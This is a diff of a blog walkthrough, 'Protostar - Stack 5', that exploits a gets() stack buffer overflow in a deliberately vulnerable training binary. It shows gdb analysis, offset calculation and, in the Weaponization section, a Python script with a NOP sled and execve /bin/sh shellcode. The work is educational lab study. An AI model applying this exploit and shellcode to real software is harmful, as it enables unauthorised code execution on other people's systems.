@@ -43,14 +43,14 @@ Powered by Hydejack v8.5.1 <https://hydejack.com/>
 <meta property="og:locale" content="en" />
 <meta name="description" content="Walkthrough of a simple binary explotation" />
 <meta property="og:description" content="Walkthrough of a simple binary explotation" />
-<link rel="canonical" href="http://localhost:4000/posts/2020-05-09-protostar-stack5/" />
-<meta property="og:url" content="http://localhost:4000/posts/2020-05-09-protostar-stack5/" />
+<link rel="canonical" href="http://localhost:4000/posts/binaryexplotation/stack%20overflow/2020-05-09-protostar-stack5/" />
+<meta property="og:url" content="http://localhost:4000/posts/binaryexplotation/stack%20overflow/2020-05-09-protostar-stack5/" />
 <meta property="og:site_name" content="Cronop.io" />
 <meta property="og:image" content="http://localhost:4000/assets/img/posts/protostar5.png" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2020-05-09T00:00:00-07:00" />
 <script type="application/ld+json">
-{"@type":"BlogPosting","headline":"Protostar - Stack 5","dateModified":"2020-05-09T00:00:00-07:00","datePublished":"2020-05-09T00:00:00-07:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/2020-05-09-protostar-stack5/"},"image":"http://localhost:4000/assets/img/posts/protostar5.png","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/icons/icon.jpg"}},"description":"Walkthrough of a simple binary explotation","url":"http://localhost:4000/posts/2020-05-09-protostar-stack5/","@context":"https://schema.org"}</script>
+{"@type":"BlogPosting","headline":"Protostar - Stack 5","dateModified":"2020-05-09T00:00:00-07:00","datePublished":"2020-05-09T00:00:00-07:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/binaryexplotation/stack%20overflow/2020-05-09-protostar-stack5/"},"image":"http://localhost:4000/assets/img/posts/protostar5.png","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/icons/icon.jpg"}},"description":"Walkthrough of a simple binary explotation","url":"http://localhost:4000/posts/binaryexplotation/stack%20overflow/2020-05-09-protostar-stack5/","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -78,7 +78,7 @@ Powered by Hydejack v8.5.1 <https://hydejack.com/>
 
 
 
-<link rel="alternate" href="http://localhost:4000/posts/2020-05-09-protostar-stack5/" hreflang="en">
+<link rel="alternate" href="http://localhost:4000/posts/binaryexplotation/stack%20overflow/2020-05-09-protostar-stack5/" hreflang="en">
 
 <link rel="shortcut icon" href="/assets/icons/favicon.ico">
 <link rel="apple-touch-icon" href="/assets/icons/icon.png">
@@ -202,7 +202,7 @@ Powered by Hydejack v8.5.1 <https://hydejack.com/>
 
 
 
-<article id="post-posts-protostar-stack5" class="page post mb6" role="article">
+<article id="post-posts-binaryexplotation-stack%20overflow-protostar-stack5" class="page post mb6" role="article">
   <header>
     <h1 class="post-title">
       
@@ -227,7 +227,7 @@ Powered by Hydejack v8.5.1 <https://hydejack.com/>
 
 
 
-in <a href="/posts/" class="flip-title">Posts</a>
+in <a href="/posts/" class="flip-title">Posts</a> / <a href="/binaryexplotation/" class="flip-title">Binary Explotation</a> / <span>Stack overflow</span>
 
       
 
@@ -349,11 +349,11 @@ stack5: setuid ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o"
 
 <ol>
   <li>The file is an <code class="highlighter-rouge">ELF 32-bit LSB executable, Intel 80386</code>. Elf is the file format, 32-bit is the word size, LSB means that least significant bytes first (Little endian) and Intel 80386 (x86) is the instruction set used.</li>
-  <li>The file has symbols, as indicated by the <code class="highlighter-rouge">not stripped</code> attribute. This is particularly helpful as we can see the original variables and function names during the debug/analysis process.</li>
-  <li>The file uses shared libraries, as it is dynamically linked. This means that it uses existing libraries in our system as part of its execution. This is helpful as it helps to identify common libraries used in the binary.</li>
+  <li>The file has symbols, as indicated by the <code class="highlighter-rouge">not stripped</code> attribute. This is particularly helpful as it is possible to see the original variables and function names during the debug/analysis process.</li>
+  <li>The file uses shared libraries, as it is dynamically linked. It uses existing libraries in the system as part of its execution. This helps to identify standard functions used in the binary.</li>
 </ol>
 
-<p>By checking the program headers of our binary it is possible to see that the stack is marked as executable. This is an indication that we could use the stack to store arbitrary code that can be executed directly if control flow of the binary is hijacked (Arbitrary code execution is commonly used to gain control of a victim’s machine):</p>
+<p>By checking the headers of the binary it is possible to see that the stack is marked as executable. This is an indication that we could use the stack to store arbitrary code that can be executed directly if control flow of the binary is hijacked (Arbitrary code execution is commonly used to gain control of a victim’s machine):</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>readelf <span class="nt">-l</span> stack5
 ...
 Program Headers:
@@ -396,15 +396,15 @@ Breakpoint 6, main <span class="o">(</span><span class="nv">argc</span><span cla
 <span class="o">(</span>gdb<span class="o">)</span> 
 </code></pre></div></div>
 
-<p>By observing a decompiled function of the program, it is possible to determine if the executable was compiled with stack protection (or stack canaries). As it will only show only the base pointer (EBP) pushed into the stack but nothing else.</p>
+<p>By observing a decompiled function of the program, it is possible to determine if the executable was compiled with stack protection (or stack canaries). As it will only show the base pointer (EBP) pushed into the stack but nothing else.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@protostar:/opt/protostar/bin<span class="nv">$ </span>objdump <span class="nt">-dj</span> .text stack5 | <span class="nb">grep</span> <span class="nt">-A10</span> <span class="s2">"&lt;main&gt;:"</span>
 080483c4 &lt;main&gt;:
  80483c4:	55                   	push   %ebp
  80483c5:	89 e5                	mov    %esp,%ebp
  
- <span class="p">;</span> A stack protected binary would have some stack guards here
- <span class="p">;</span> that would like something like this:
+ <span class="p">;</span> A stack protected binary would have some stack guards here,
+ <span class="p">;</span> it would like something like this:
  <span class="p">;</span>mov    %fs:0x28,%rax     &lt;- get guard variable value
  <span class="p">;</span>mov    %rax,-0x8<span class="o">(</span>%rbp<span class="o">)</span>   &lt;- save guard variable on stack
  
@@ -429,7 +429,7 @@ Breakpoint 6, main <span class="o">(</span><span class="nv">argc</span><span cla
 
 <h3 id="analyze-symbols">Analyze symbols</h3>
 
-<p>We will list the functions available since symbols are not stripped.</p>
+<p>GDB will be used to list the functions available since symbols are not stripped.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> info functions
 All defined functions:
@@ -454,7 +454,7 @@ Non-debugging symbols:
 0x08048450  __do_global_ctors_aux
 0x0804847c  _fini
 </code></pre></div></div>
-<p>We also executed the next objdump command (-M intel to set intel flavor mode, -T to list the dynamic symbol table and -C to demangle the functions):</p>
+<p><code class="highlighter-rouge">objdump</code> command can be used as well for the same purpose (-M intel to set intel flavor mode, -T to list the dynamic symbol table and -C to demangle the functions):</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$objdump</span> <span class="nt">-M</span> intel <span class="nt">-TC</span> stack4
 DYNAMIC SYMBOL TABLE:
@@ -467,9 +467,9 @@ DYNAMIC SYMBOL TABLE:
 
 <h3 id="analyze-binary-flow">Analyze binary flow</h3>
 
-<p>It seems that there is not much going on in the binary. Not many functions except from <code class="highlighter-rouge">gets</code>, <code class="highlighter-rouge">puts</code> and <code class="highlighter-rouge">main</code>. Let’s explore the main function to see the flow of the program.</p>
+<p>It seems that there is not much going on in the binary. Not many functions except from <code class="highlighter-rouge">gets</code>, <code class="highlighter-rouge">puts</code> and <code class="highlighter-rouge">main</code>. Next step is to explore the <code class="highlighter-rouge">main</code> function to see the flow of the program.</p>
 
-<p>Let’s run the program and break on the main function.</p>
+<p>The program was run through GDB and a break point was set on the main function.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gdb stack5
 <span class="o">(</span>gdb<span class="o">)</span> b main
@@ -482,7 +482,7 @@ Breakpoint 1, main <span class="o">(</span><span class="nv">argc</span><span cla
 	<span class="k">in </span>stack5/stack5.c
 </code></pre></div></div>
 
-<p>Let’s disassemble main, to see the flow of the program. First, we loaded the binary in gdb and set a breakpoint in the main function to disassemble it.</p>
+<p>Through GDB, the <code class="highlighter-rouge">main</code> function will be disassembled, this is done to see the flow of the program.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly-flavor intel
 <span class="o">(</span>gdb<span class="o">)</span> disassemble 
@@ -499,16 +499,17 @@ Dump of assembler code <span class="k">for function </span>main:
 End of assembler dump.
 </code></pre></div></div>
 
-<p>Let’s breakdown what is going on in the main function:</p>
+<p>An instruction per instruction breakdown of the <code class="highlighter-rouge">main</code> function is done to understand the flow of the program:</p>
+
 <ol>
-  <li>The first four instructions correspond to the prologue of the function:
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>push   ebp               <span class="p">;</span> This saves the previous base pointer to the stack
+  <li>The first four instructions correspond to the prologue of the function:</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>push   ebp               <span class="p">;</span> This saves the previous base pointer to the stack
 mov    ebp,esp           <span class="p">;</span> This sets the current base point to the current stack pointer value
 and    esp,0xfffffff0    <span class="p">;</span> <span class="k">*</span>This aligns the stack pointer to 16 bits.
 sub    esp,0x50          <span class="p">;</span> This allocates <span class="nb">local </span>variables <span class="k">for </span>this <span class="k">function in </span>the stack.
-</code></pre></div>    </div>
-  </li>
-</ol>
+</code></pre></div></div>
 
 <p><em>*All x86 programs are 16-bit aligned. This is done since processor architectures have better performance on aligned memory. </em></p>
 
@@ -522,9 +523,9 @@ call   0x80482e8 &lt;gets@plt&gt;  <span class="p">;</span> Calls the gets <span
   </li>
 </ol>
 
-<p>From this we can appreciate that we are passing a pointer to SP + 0x10 as the argument to the <code class="highlighter-rouge">gets</code> function.</p>
+<p>From the previous figure it is possible to appreciate that <code class="highlighter-rouge">main</code> is passing a pointer of value SP + 0x10 as the argument to the <code class="highlighter-rouge">gets</code> function.</p>
 
-<p>We know that GLIBC_2.0 <code class="highlighter-rouge">gets</code> has the following definition, which is inline to what we see in the disassembly:</p>
+<p>Manpages states that GLIBC_2.0 <code class="highlighter-rouge">gets</code> has the following definition, which is inline to what is observed in the disassembly:</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span> <span class="o">*</span><span class="n">gets</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
 </code></pre></div></div>
 
@@ -538,13 +539,14 @@ call   0x80482e8 &lt;gets@plt&gt;  <span class="p">;</span> Calls the gets <span
 
 <h3 id="identify-the-vulnerability">Identify the vulnerability</h3>
 
-<p>In this case we know that <code class="highlighter-rouge">gets</code> is an inherently unsafe function. <code class="highlighter-rouge">gets</code> is supposed to read from stdin and copy the input into a buffer. The basic problem is that <code class="highlighter-rouge">gets</code> doesn’t know the length of the buffer, so it continues reading until it finds a newline or encounters EOF, and may overflow the bounds of the buffer it was given to it.</p>
+<p><code class="highlighter-rouge">gets</code> is an inherently unsafe function. <code class="highlighter-rouge">gets</code> is supposed to read from stdin and copy the input into a buffer. The basic problem is that <code class="highlighter-rouge">gets</code> doesn’t know the length of the buffer, so it continues reading until it finds a newline or encounters EOF, and may overflow the bounds of the buffer it was given to it.</p>
 
-<p>From the disassembly we know that the buffer pointer we are passing is from the stack:</p>
+<p>From the disassembly it is possible to see that the buffer address being passed points to a section in the stack:</p>
+
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sub    esp,0x50          <span class="p">;</span> Allocates 0x50 bytes from the stack
 lea    eax,[esp+0x10]    <span class="p">;</span> <span class="k">*</span>Gives a pointer that is at offset 0x10 from the top of our stack
 </code></pre></div></div>
-<p><em>*The behavior of stack (growing up or growing down) depends on the application binary interface (ABI) and how the call stack is organized. In this case, the stack grows downwards.</em></p>
+<p><em>*The behavior of stack (growing up or growing down) depends on the application binary interface (ABI) and how the call stack is organized. In this case, the stack grows downwards. This is known through the architecture and system the binary is targeted towards.</em></p>
 
 <p>A stack frame represents a function call in a regular program. A normal stack frame (this can vary depending on architecture) looks like the following:</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+--------------------+ 0x00000000
@@ -583,9 +585,9 @@ lea    eax,[esp+0x10]    <span class="p">;</span> <span class="k">*</span>Gives 
   <li>Allocate the local variables’ memory.</li>
 </ol>
 
-<p>In our case #1 and #2 are depicted in a single instruction which is <code class="highlighter-rouge">call</code>.</p>
+<p>In this case #1 and #2 are depicted in a single instruction which is <code class="highlighter-rouge">call</code>.</p>
 
-<p>To illustrate this, let’s single-step through the <code class="highlighter-rouge">gets</code> function call:</p>
+<p>To illustrate this, GDB will be used to single-step through the <code class="highlighter-rouge">gets</code> function call:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> si
 0x080483d4	10	<span class="k">in </span>stack5/stack5.c <span class="p">;</span>&lt;main+16&gt;
@@ -630,7 +632,7 @@ gs             0x33	51
 
 </code></pre></div></div>
 
-<p>As we can see above we are about to execute instruction <code class="highlighter-rouge">0x080483d4 &lt;main+16&gt;:	call   0x80482e8 &lt;gets@plt&gt;</code> our instruction pointer EIP also shows this as it has <code class="highlighter-rouge">0x80483d4</code> as value. Let see what happens when we go into the function.</p>
+<p>As observed above the program is about to execute instruction <code class="highlighter-rouge">0x080483d4 &lt;main+16&gt;:	call   0x80482e8 &lt;gets@plt&gt;</code> the instruction pointer (EIP) also shows this as it has <code class="highlighter-rouge">0x80483d4</code> as value. Proceding with the program execution, <code class="highlighter-rouge">si</code> is used to step into <code class="highlighter-rouge">gets</code> function call.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> si
 0x080482e8 <span class="k">in </span>gets@plt <span class="o">()</span>
@@ -662,11 +664,11 @@ gs             0x33	51
 
 </code></pre></div></div>
 
-<p>By executing <em>call</em>, the program did two things, (#1) it jumped into the <code class="highlighter-rouge">gets</code> function as showed by our instruction pointer EIP and (#2) it pushed <code class="highlighter-rouge">0x080483d9</code> to our stack as well (which corresponds to <code class="highlighter-rouge">0x080483d9 &lt;main+21&gt;:    leave </code>).</p>
+<p>By executing <em>call</em>, the program did two things, (#1) it jumped into the <code class="highlighter-rouge">gets</code> function as showed by the instruction pointer EIP and (#2) it pushed <code class="highlighter-rouge">0x080483d9</code> to the stack as well (which corresponds to <code class="highlighter-rouge">0x080483d9 &lt;main+21&gt;:    leave </code>).</p>
 
-<p>Let’s continue stepping in:</p>
+<p>Proceding with the execution:</p>
 
-<p>Since we are calling into a dynamic library there will be some extra steps happening (loading the library and doing a lookup of the actual address of <code class="highlighter-rouge">gets</code>), but finally we arrive into the <code class="highlighter-rouge">gets</code> function which points to the<code class="highlighter-rouge">_IO_gets</code> in the GLIBC_2.0 library:</p>
+<p>Since the program calls into a dynamic library there will be some additional steps happening (loading the library and doing a lookup of the actual address of <code class="highlighter-rouge">gets</code>), but finally the execution arrives into the <code class="highlighter-rouge">gets</code> function which points to the<code class="highlighter-rouge">_IO_gets</code> in the GLIBC_2.0 library:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> si
 0xb7ef3e46	39	<span class="k">in </span>iogets.c
@@ -685,9 +687,9 @@ Dump of assembler code <span class="k">for function </span>_IO_gets:
 
 </code></pre></div></div>
 
-<p>As we enter the <code class="highlighter-rouge">gets</code> function the program will (#3) push the base pointer of the current stack frame (main’s stack frame) into the stack, (#4) setting te current stack pointer as the base pointer and (#5) it will allocate 0x24 bytes in the stack.</p>
+<p>As the execution enters the <code class="highlighter-rouge">gets</code> function the program will (#3) push the base pointer of the current stack frame (<code class="highlighter-rouge">main</code>’s stack frame) into the stack, (#4) will set the current stack pointer as the base pointer and (#5) will allocate 0x24 bytes in the stack.</p>
 
-<p>As we can see in the printed stack above, the first 24 bytes are some allocated data used by gets, the next 4 bytes are <code class="highlighter-rouge">main</code>’s base pointer (0xbffff7a8) and the following 4 bytes are the return pointer (0x080483d9) or <code class="highlighter-rouge">&lt;main+21&gt;:    leave </code>.</p>
+<p>As is seen in the printed stack above, the first 24 bytes are some allocated data used by gets, the next 4 bytes are <code class="highlighter-rouge">main</code>’s base pointer (0xbffff7a8) and the following 4 bytes are the return pointer (0x080483d9) or <code class="highlighter-rouge">&lt;main+21&gt;:    leave </code>.</p>
 
 <p>Based on our stack representation, we have the following:</p>
 
@@ -723,9 +725,9 @@ Dump of assembler code <span class="k">for function </span>_IO_gets:
 +--------------------+ 0xFFFFFFFF
 </code></pre></div></div>
 
-<p>Based on the previous statements, we can exploit <code class="highlighter-rouge">gets</code> vulnerability to overwrite <code class="highlighter-rouge">main</code>’s return pointer and hijack the execution towards an address that we desire.</p>
+<p>Based on the previous statements, it is possible to exploit <code class="highlighter-rouge">gets</code> vulnerability to overwrite <code class="highlighter-rouge">main</code>’s return pointer and hijack the execution towards an address that is desired.</p>
 
-<p>We know that the buffer passed to <code class="highlighter-rouge">gets</code> resides in 0xbffff750 + 0x10 (Remember <code class="highlighter-rouge">main</code> dissasemble):</p>
+<p>Based on the previous information, it is known that the buffer passed to <code class="highlighter-rouge">gets</code> resides in 0xbffff750 + 0x10 (Based on <code class="highlighter-rouge">main</code>’s dissasemble):</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> si
 0x080483d1	10	<span class="k">in </span>stack5/stack5.c
@@ -738,7 +740,7 @@ Dump of assembler code <span class="k">for function </span>main:
 0x080483d4 &lt;main+16&gt;:	call   0x80482e8 &lt;gets@plt&gt;
 
 <span class="o">(</span>gdb<span class="o">)</span> x <span class="nv">$esp</span>
-0xbffff750:	0xb7fd7ff4 <span class="p">;</span> We care about the address not the value
+0xbffff750:	0xb7fd7ff4 <span class="p">;</span> Focus on the address
 </code></pre></div></div>
 
 <p>The stack would look something like this:</p>
@@ -809,20 +811,20 @@ frame        |  +--------------------+ &lt;------+ Main's Return Pointer (0xbfff
                 +--------------------+ 0xFFFFFFFF
 </code></pre></div></div>
 
-<p>We know <code class="highlighter-rouge">mains</code>’s EBP is 0xbffff7a8 (from the <code class="highlighter-rouge">gets</code>’ stack frame. A register in a 32bit architecture corresponds to 4 bytes. So <code class="highlighter-rouge">main</code>s caller EBP will be stored from  0xbffff7a8 to 0xbffff7ac. The value that follows in the stack after the saved EBP is the return pointer. The return address is stored at 0xbffff7ac (where the stored EBP ends). In order to overwrite the return address <code class="highlighter-rouge">gets</code> would need to write from 0xbffff760 to 0xbffff7b0, which is 80 bytes (76 padding + 4 new return address).</p>
+<p><code class="highlighter-rouge">mains</code>’s EBP is 0xbffff7a8 (information extracted from the <code class="highlighter-rouge">gets</code>’ stack frame). A register in a 32bit architecture corresponds to 4 bytes. So <code class="highlighter-rouge">main</code>s caller EBP will be stored from  0xbffff7a8 to 0xbffff7ac. The value that follows in the stack after the saved EBP is the return pointer (<code class="highlighter-rouge">mains</code>’s EIP before <code class="highlighter-rouge">gets</code> was called). The return address is stored at 0xbffff7ac (where the stored EBP ends). In order to overwrite the return address <code class="highlighter-rouge">gets</code> would need to write from 0xbffff760 to 0xbffff7b0, which is 80 bytes (76 padding + 4 new return address).</p>
 
 <h3 id="exploitation">Exploitation</h3>
 
 <h4 id="taking-control-of-execution">Taking control of execution</h4>
 
-<p>Based on the previous section, it is known that to overwrite <code class="highlighter-rouge">main</code>’s return pointer <code class="highlighter-rouge">gets</code> needs to read 80 bytes. This to overflow the local variable section, ebp section, and return pointer section of <code class="highlighter-rouge">main</code>’s stack frame.</p>
+<p>Based on the previous section, it is known that to overwrite <code class="highlighter-rouge">main</code>’s return pointer <code class="highlighter-rouge">gets</code> needs to read 80 bytes from stdin. This to overflow the local variable section, ebp section, and return pointer section of <code class="highlighter-rouge">main</code>’s stack frame.</p>
 
-<p>To achieve that we need to pass a payload similar to this:</p>
+<p>To achieve it a payload similar to this will be sent:</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>76 bytes + return address
 </code></pre></div></div>
 
-<p>In order to do that, we can use the following python script. For now, the instruction pointer (return address) was set to 0x45454545:</p>
+<p>In order to do it, a python script will be used. For now, the instruction pointer (return address) was set to 0x45454545 to illustrate the hijacking of the return address:</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">struct</span>
 
@@ -838,14 +840,14 @@ user@protostar:~<span class="nv">$ </span><span class="nb">cat </span><span clas
 ����������������������������������������������������������������������������EEEE
 </code></pre></div></div>
 
-<p>Let’s use the <em>in.txt</em> as input to our program in GDB:</p>
+<p><em>in.txt</em> was used as input to our program in GDB:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> b main
 Breakpoint 6 at 0x80483cd: file stack5/stack5.c, line 10.
 <span class="o">(</span>gdb<span class="o">)</span> r &lt; ~/in.txt
 </code></pre></div></div>
 
-<p>A breakpoint in main was set so we can analyze how the stack is modified by the provided input. By analyzing the stack after the <code class="highlighter-rouge">gets</code> function was executed we can see the following:</p>
+<p>A breakpoint in main was set so to analyze how the stack is modified by the provided input. By analyzing the stack after the <code class="highlighter-rouge">gets</code> function was executed the following can be observed:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> info registers
 ...
@@ -881,9 +883,9 @@ End of assembler dump.
 
 </code></pre></div></div>
 
-<p>From above it is possible to observe that the return pointer was overwritten successfully with the value we provided (0x45454545). In Analyze File section it was stated that this binary allows execution from stack as it has NX feature disabled. This means that it is possible to execute written from the stack.</p>
+<p>In the previous figure it is observed that the return pointer was overwritten successfully with the value we provided (0x45454545). In Analyze File section it was stated that this binary allows execution from stack as it has NX feature disabled. This means that it is possible to execute written from the stack.</p>
 
-<p>Payload will be updated to accommodate instructions to be executed by redirecting the return pointer to that memory in the stack. This is illustrated in the following diagram:</p>
+<p>Input passed to the program will be updated to accommodate instructions the will be executed by redirecting the return pointer to that memory in the stack. This is illustrated in the following diagram:</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                               +--------------------+ 0x00000000
                                |                    |
@@ -931,7 +933,7 @@ payload    |                |  | return address]    |
 <span class="k">print</span><span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">returnPointer</span> <span class="o">+</span> <span class="n">instructions</span><span class="p">)</span>
 </code></pre></div></div>
 
-<p>By passing this input to gdb, and analyzing the stack just before ret gets called, it is possible to observe how the stack was changed:</p>
+<p>By passing this input to gdb, and analyzing the stack just before <code class="highlighter-rouge">ret</code> gets called, it is possible to observe how the stack was changed:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> r &lt; ~/in.txt
 Breakpoint 7, main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="nt">-858993460</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff800<span class="o">)</span> at stack5/stack5.c:11
@@ -962,9 +964,9 @@ End of assembler dump.
 <span class="o">(</span>gdb<span class="o">)</span> 
 </code></pre></div></div>
 
-<p><code class="highlighter-rouge">main</code>’s return pointer is overwritten to 0xbffff7b0, this means that when the ret instruction is called the next instruction to be executed will be the one stored in that address. Which in this case was overwritten with 0xCC (<code class="highlighter-rouge">int3</code>) instruction.</p>
+<p><code class="highlighter-rouge">main</code>’s return pointer is overwritten to 0xbffff7b0, this means that when the <code class="highlighter-rouge">ret</code> instruction is called the next instruction to be executed will be the one stored in that address. Which in this case was overwritten with 0xCC (<code class="highlighter-rouge">int3</code>) instruction.</p>
 
-<p>By continuing execution in GDB, we can observe that the injected payload was executed and that the breakpoint trap was surfaced to GDB.</p>
+<p>By continuing execution in GDB, it is observed that the injected payload was executed and that the breakpoint trap was surfaced to GDB.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> c
 Continuing.
@@ -1061,19 +1063,19 @@ Program received signal SIGTRAP, Trace/breakpoint trap.
 
 <h4 id="nop-sled">NOP-Sled</h4>
 
-<p>A NOP-sled is a sequence of NOP instructions to make the execution slide to the next memory address with a valid instruction. A NOP-sled will be placed after the return pointer in the constructed payload. Using a large number of NOPs will increase the chance to jump into the crafted exploit, as if we miss and point to a NOP, it will just slide to the end of the payload which contains the instructions to be executed.</p>
+<p>A NOP-sled is a sequence of NOP instructions to make the execution slide to the next memory address with a valid instruction. A NOP-sled will be placed after the return pointer in the constructed payload. Using a large number of NOPs will increase the chance to jump into the crafted exploit, in case the hijacked return pointer misses and point to a NOP, it will just slide to the end of the payload which contains the instructions to be executed.</p>
 
 <h4 id="weaponization">Weaponization</h4>
-<p>To weaponize the vulnerability, a shellcode for Linux x86 Intel architecture based on <a href="http://shell-storm.org/shellcode/files/shellcode-906.php">Andres C. Rodriguez </a>’s concept will be injected at the end of our payload. The Python script used to abuse the buffer overflow with a shellcode injection is:</p>
+<p>To weaponize the vulnerability, a shellcode for Linux x86 Intel architecture based on <a href="http://shell-storm.org/shellcode/files/shellcode-906.php">Andres C. Rodriguez </a>’s concept will be injected at the end of the payload. The Python script used to abuse the buffer overflow with a shellcode injection is:</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">struct</span>
 
 <span class="n">padding</span> <span class="o">=</span> <span class="s">'</span><span class="si">\</span><span class="se">xAA</span><span class="s">'</span> <span class="o">*</span> <span class="mi">76</span>
 <span class="n">returnPointer</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xbffff7c0</span><span class="p">)</span>
-<span class="n">nop_sled</span> <span class="o">=</span> <span class="s">"</span><span class="si">\</span><span class="se">x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">50</span>
+<span class="n">nopSled</span> <span class="o">=</span> <span class="s">"</span><span class="si">\</span><span class="se">x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">50</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">\</span><span class="se">x83</span><span class="si">\</span><span class="se">xc4</span><span class="si">\</span><span class="se">x18</span><span class="si">\</span><span class="se">x31</span><span class="si">\</span><span class="se">xc0</span><span class="si">\</span><span class="se">x31</span><span class="si">\</span><span class="se">xdb</span><span class="si">\</span><span class="se">xb0</span><span class="si">\</span><span class="se">x06</span><span class="si">\</span><span class="se">xcd</span><span class="si">\</span><span class="se">x80</span><span class="si">\</span><span class="se">x53</span><span class="si">\</span><span class="se">x68</span><span class="s">/tty</span><span class="si">\</span><span class="se">x68</span><span class="s">/dev</span><span class="si">\</span><span class="se">x89</span><span class="si">\</span><span class="se">xe3</span><span class="si">\</span><span class="se">x31</span><span class="si">\</span><span class="se">xc9</span><span class="si">\</span><span class="se">x66</span><span class="si">\</span><span class="se">xb9</span><span class="si">\</span><span class="se">x12</span><span class="si">\</span><span class="se">x27</span><span class="si">\</span><span class="se">xb0</span><span class="si">\</span><span class="se">x05</span><span class="si">\</span><span class="se">xcd</span><span class="si">\</span><span class="se">x80</span><span class="si">\</span><span class="se">x6a</span><span class="si">\</span><span class="se">x17</span><span class="si">\</span><span class="se">x58</span><span class="si">\</span><span class="se">x31</span><span class="si">\</span><span class="se">xdb</span><span class="si">\</span><span class="se">xcd</span><span class="si">\</span><span class="se">x80</span><span class="si">\</span><span class="se">x6a</span><span class="si">\</span><span class="se">x2e</span><span class="si">\</span><span class="se">x58</span><span class="si">\</span><span class="se">x53</span><span class="si">\</span><span class="se">xcd</span><span class="si">\</span><span class="se">x80</span><span class="si">\</span><span class="se">x31</span><span class="si">\</span><span class="se">xc0</span><span class="si">\</span><span class="se">x50</span><span class="si">\</span><span class="se">x68</span><span class="s">//sh</span><span class="si">\</span><span class="se">x68</span><span class="s">/bin</span><span class="si">\</span><span class="se">x89</span><span class="si">\</span><span class="se">xe3</span><span class="si">\</span><span class="se">x50</span><span class="si">\</span><span class="se">x53</span><span class="si">\</span><span class="se">x89</span><span class="si">\</span><span class="se">xe1</span><span class="si">\</span><span class="se">x99</span><span class="si">\</span><span class="se">xb0</span><span class="si">\</span><span class="se">x0b</span><span class="si">\</span><span class="se">xcd</span><span class="si">\</span><span class="se">x80</span><span class="s">"</span>
 
-<span class="k">print</span><span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">returnPointer</span> <span class="o">+</span> <span class="n">nop_sled</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">returnPointer</span> <span class="o">+</span> <span class="n">nopSled</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p><strong>Note:</strong> The return pointer can be any value that lands in the NOP sled.</p>
